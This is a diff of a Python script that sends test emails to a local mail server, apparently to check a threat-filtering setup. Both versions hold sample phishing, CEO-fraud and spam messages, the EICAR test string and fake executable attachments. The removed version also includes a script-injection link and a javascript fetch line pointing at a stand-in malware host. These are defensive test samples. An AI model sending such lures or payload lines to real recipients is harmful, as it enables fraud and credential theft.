@@ -1,88 +1,310 @@
-#!/usr/bin/env python3
 import smtplib
-import os
-from email.message import EmailMessage
 import time
+from email.message import EmailMessage
 
-# ───── Configuration ─────────────────────────────────────────────────────────
-SMTP_HOST = "127.0.0.1"
-SMTP_PORT = 10026   
-FROM_ADDR  = "sender@email-threat-docker.local"
-TO_ADDR    = "recipient@email-threat-docker.local"
+# Configuration
+SMTP_SERVER = '127.0.0.1'
+SMTP_PORT = 25
+RECIPIENT = 'recipient@email-threat-docker.local'
+DELAY_SECONDS = 1  # delay between sending emails in seconds
 
-# ───── Test Messages ─────────────────────────────────────────────────────────
-tests = [
-    # 10 Clean Emails
-    ("Team Lunch", "Who's up for pizza on Friday?", None),
-    ("Project Update", "The Q2 deliverables are attached", {"report.pdf": b"PDF: Project milestones..."}),
-    ("Meeting Reminder", "Don't forget our 2pm meeting!", None),
-    ("Network Maintenance", "Scheduled downtime tonight 11PM-1AM", None),
-    ("New Policy Document", "Please review attached handbook", {"handbook.docx": b"DOCX: Company policies..."}),
-    ("Welcome New Hire", "Please welcome Alice to the team!", None),
-    ("Office Closure", "HQ will be closed for Memorial Day", None),
-    ("Benefits Update", "New healthcare options available", None),
-    ("Password Policy Reminder", "Remember to change passwords quarterly", None),
-    ("Conference Registration", "Industry summit registration open", None),
+# Define 10 clean emails
+emails = [
+    {
+        "from": "notifications@company.com",
+        "subject": "Welcome to Our Service",
+        "body": """Dear User,
 
-    # 10 Malicious Emails (with rule triggers)
-    ("URGENT: Security Alert", "Scan attached file immediately!", 
-     {"eicar.com": b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"}),
-    
-    ("Invoice #INV-9876", "Please review payment details",
-     {"invoice.exe": b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff" + b"PE\x00\x00" + os.urandom(1000)}),
-     
-    ("Account Verification Needed", "Click here: http://malicious.link/verify?user=<script>stealCreds()</script>", None),
-     
-    ("Document Shared", """<html><body><script>malware.download()</script>View document</body></html>""", 
-     None, "html"),
-     
-    ("Encrypted Report", "Password: infected", 
-     {"data.bin": os.urandom(1024)}),
-     
-    ("Password Reset Required", "Immediate action required: http://phishing-site.com/reset", None),
-     
-    ("Your Package Tracking", "javascript:fetch('http://malware-download.com/payload')", None),
-     
-    ("Financial Report", "See attached analysis", 
-     {"report.zip": b"PK\x03\x04" + os.urandom(500)}),  # ZIP header
-     
-    ("Microsoft Security Update", "Critical patch - apply immediately", 
-     {"update.msi": b"MZ" + os.urandom(1000)}),
-     
-    ("Undelivered Mail Notification", """<img src="http://tracker.com/pixel.gif">""", 
-     {"details.eml": b"From: <spoofed@ceo.com>\nSubject: Wire transfer\n"})
+Thank you for signing up for our service. We’re excited to have you on board. You can log in anytime at https://app.company.com to manage your account.
+
+Best regards,
+Company Team
+"""
+    },
+    {
+        "from": "newsletter@store.com",
+        "subject": "September Newsletter – Special Offers Inside!",
+        "body": """Hello,
+
+Check out our latest products and exclusive deals on our website at https://www.store.com. We appreciate your loyalty and hope you enjoy these updates.
+
+Sincerely,
+Store Team
+"""
+    },
+    {
+        "from": "hr@company.com",
+        "subject": "Upcoming Holiday Schedule",
+        "body": """Dear Team,
+
+Please note that the company will be closed on Monday for the public holiday. Regular work resumes on Tuesday at 9 AM. Enjoy your long weekend!
+
+Best,
+HR Department
+"""
+    },
+    {
+        "from": "teamlead@company.com",
+        "subject": "Project Kickoff Meeting",
+        "body": """Hi Everyone,
+
+You are invited to the project kickoff meeting this Friday at 2 PM in Conference Room A. Please see the calendar invite and let me know if you have any questions.
+
+Thanks,
+Team Lead
+"""
+    },
+    {
+        "from": "noreply@itdept.company.com",
+        "subject": "Scheduled Maintenance Tonight",
+        "body": """Dear User,
+
+This is to inform you that there will be a brief network outage tonight from 11 PM to midnight due to scheduled maintenance. No action is required on your part.
+
+IT Department
+"""
+    },
+    {
+        "from": "alerts@service.com",
+        "subject": "Your Subscription Renewal Confirmation",
+        "body": """Hi,
+
+Your subscription has been successfully renewed. The payment of $49.99 has been processed. Thank you for choosing our service!
+
+Regards,
+Billing Team
+"""
+    },
+    {
+        "from": "events@company.com",
+        "subject": "Join Us for the Charity Run!",
+        "body": """Hello,
+
+You are invited to participate in our annual charity run this weekend. Visit our website for details and registration. We look forward to seeing you there!
+
+Cheers,
+Community Outreach Team
+"""
+    },
+    {
+        "from": "security@service.com",
+        "subject": "Password Change Successful",
+        "body": """Hello,
+
+This is a confirmation that your account password was successfully changed. If you did not make this change, please contact our support team immediately.
+
+Thank you,
+Security Team
+"""
+    },
+    {
+        "from": "devteam@company.com",
+        "subject": "Feature X Deployment",
+        "body": """Team,
+
+Feature X has been deployed to the production environment. All tests passed, and performance is stable. Please report any issues to the development channel.
+
+Thanks,
+Dev Team
+"""
+    },
+    {
+        "from": "communications@company.com",
+        "subject": "Town Hall Meeting Next Week",
+        "body": """Dear Colleagues,
+
+We will be holding a company-wide town hall meeting next Wednesday at 10 AM via video conference. An invite with dial-in details will follow soon.
+
+Best regards,
+Communications
+"""
+    },
 ]
 
-def send_email(subject, body, attachment=None, content_type="plain"):
-    msg = EmailMessage()
-    msg["From"] = FROM_ADDR
-    msg["To"] = TO_ADDR
-    msg["Subject"] = subject
-    msg.set_content(body, subtype=content_type)
-    
-    if attachment:
-        for fname, data in attachment.items():
-            msg.add_attachment(data,
-                               maintype="application",
-                               subtype="octet-stream",
-                               filename=fname)
-    with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as smtp:
-        result = smtp.send_message(msg)
-    return result
+# Define 20 malicious emails
+malicious_emails = [
+    {
+        "from": "billing@legit-company.com",
+        "subject": "Urgent: Invoice Payment Required",
+        "body": """Hello,
 
-def main():
-    print("Sending test emails...\n")
-    for i, test in enumerate(tests):
-        if len(test) == 3:
-            subj, body, attach = test
-            content_type = "plain"
-        else:
-            subj, body, attach, content_type = test
-            
-        resp = send_email(subj, body, attach, content_type)
-        status = "CLEAN" if i < 10 else "MALICIOUS"
-        print(f"[{status}] {subj}: {'Delivered' if not resp else 'Blocked'}")
-        time.sleep(0.1)
+Your invoice is overdue. Click here to view and pay: http://phishingsite.example.com/invoice?id=12345
 
-if __name__ == "__main__":
-    main()
+Thank you.
+"""
+    },
+    {
+        "from": "deals@newsletter.com",
+        "subject": "Hot Deals This Weekend!",
+        "body": """Hi,
+
+Don't miss out on exclusive offers at spamdomain.net! Visit our site: http://spamdomain.net/sale
+
+Cheers.
+"""
+    },
+    {
+        "from": "security@onlinebank.com",
+        "subject": "Account Locked",
+        "body": """Dear user,
+
+We detected suspicious activity. Please click here to unlock your account: http://fakebank.example.com/verify
+
+Regards.
+"""
+    },
+    {
+        "from": "support@service.com",
+        "subject": "Password Reset Required",
+        "body": """Hello,
+
+Your password must be reset due to a security issue. Click here to reset your password immediately: http://service.example.com/reset-password
+
+Thanks.
+"""
+    },
+    {
+        "from": "Alice Smith <alice.smith@bigcorp.com>",
+        "subject": "Urgent Wire Transfer",
+        "body": """Hi,
+
+I am in a meeting right now. Please urgently transfer $15,000 to account 987654321 at ACME Bank.
+Do not reply to this email.
+
+Thanks.
+"""
+    },
+    {
+        "from": "info@company.com",
+        "subject": "Important Document",
+        "body": """Hello,
+
+See the attached invoice.exe for details on your recent purchase. It's an urgent matter.
+"""
+    },
+    {
+        "from": "admin@company.com",
+        "subject": "Monthly Report",
+        "body": """Attached is the report. The attachment contains the antivirus test string: X5O!P%@AP[4PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+Please check it.
+"""
+    },
+    {
+        "from": "notifications@company.com",
+        "subject": "Security Alert",
+        "body": """Hi,
+
+Please see the attached update.scr to view important security information.
+"""
+    },
+    {
+        "from": "support@service.com",
+        "subject": "System Notification",
+        "body": """Hello,
+
+Please visit http://example.com/%68%61%63%6b%65%64 where you'll find important information.
+"""
+    },
+    {
+        "from": "support@service.com",
+        "subject": "Final Warning",
+        "body": """Dear customer,
+
+This is your final warning to update your payment information. Visit our secure portal here: http://secure-update.example.com/account
+"""
+    },
+    {
+        "from": "hr@company.com",
+        "subject": "Mandatory W-2 Form",
+        "body": """Hello,
+
+Please click here to fill out your W-2 tax form: http://legit-bank.info/w2form
+"""
+    },
+    {
+        "from": "updates@deals.com",
+        "subject": "Special Announcement",
+        "body": """Don’t miss this! Visit spamdomain.net now for more details.
+"""
+    },
+    {
+        "from": "support@apple.com",
+        "subject": "Account Verification Needed",
+        "body": """Dear User,
+
+Your Apple ID has unusual activity. Click here to sign in and secure your account: http://malicious-verify.example.com/login
+"""
+    },
+    {
+        "from": "support@bank.com",
+        "subject": "Password Reset Request",
+        "body": """Hello,
+
+We received a request to reset your password. Click here to reset it: http://bank.example.com/reset
+"""
+    },
+    {
+        "from": "hr@company.com",
+        "subject": "Mandatory Company Survey",
+        "body": """Hello,
+
+Please click here to complete the employee satisfaction survey: http://survey.example.com/
+"""
+    },
+    {
+        "from": "support@onlineservice.com",
+        "subject": "Suspicious Login Attempt",
+        "body": """We’ve noticed a login from a new device. Click here to review the activity: http://alert.example.com/review
+"""
+    },
+    {
+        "from": "security@bigcorp.com",
+        "subject": "Account Compromised",
+        "body": """Your account was compromised. Reset your password immediately: http://bigcorp.example.com/reset
+"""
+    },
+    {
+        "from": "rewards@shopping.com",
+        "subject": "You've Won a $100 Gift Card!",
+        "body": """Congratulations! Claim your $100 gift card by clicking here: http://freegift.example.com/claim
+"""
+    },
+    {
+        "from": "survey@company.com",
+        "subject": "Quick Employee Survey",
+        "body": """Hello,
+
+Click here to provide feedback and win a prize: http://survey.example.com/
+"""
+    },
+    {
+        "from": "recruiter@jobs.com",
+        "subject": "Job Interview Invitation",
+        "body": """Hi,
+
+We received your resume for an open position. Please fill out this form: http://jobs.example.com/form
+"""
+    },
+]
+
+# Combine into one list
+emails += malicious_emails
+
+# Send emails
+with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
+    for idx, email in enumerate(emails, start=1):
+        msg = EmailMessage()
+        msg['From'] = email['from']
+        msg['To'] = RECIPIENT
+        msg['Subject'] = email['subject']
+        msg.set_content(email['body'])
+        
+        try:
+            smtp.send_message(msg)
+            print(f"[✔] Sent email {idx}/{len(emails)}: {email['subject']}")
+        except Exception as e:
+            print(f"[✗] Failed to send email {idx}: {e}")
+        
+        # Delay before sending the next email
+        if idx < len(emails):
+            time.sleep(DELAY_SECONDS)
